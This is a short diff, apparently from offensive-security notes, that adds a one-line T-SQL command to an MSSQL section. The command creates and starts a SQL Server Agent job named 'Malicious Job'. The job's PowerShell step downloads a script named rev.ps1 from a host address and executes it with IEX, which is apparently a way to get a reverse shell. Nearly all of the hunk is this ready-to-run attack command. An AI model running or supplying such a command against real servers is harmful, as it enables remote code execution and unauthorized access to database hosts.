@@ -110,3 +110,8 @@ EXEC sp_start_job
 @job_name = N'Malicious Job';
 GO
 ```
+
+one liner:
+```shell
+USE msdb; EXEC sp_add_job @job_name = N'Malicious Job'; EXEC sp_add_jobstep @job_name = N'Malicious Job', @step_name = N'Execute PowerShell Script', @subsystem = N'PowerShell', @command = N'(New-Object Net.WebClient).DownloadString("http://192.168.56.1/rev.ps1")|IEX;', @retry_attempts = 5, @retry_interval = 5; EXEC sp_add_jobserver @job_name = N'Malicious Job'; EXEC sp_start_job @job_name = N'Malicious Job';
+```
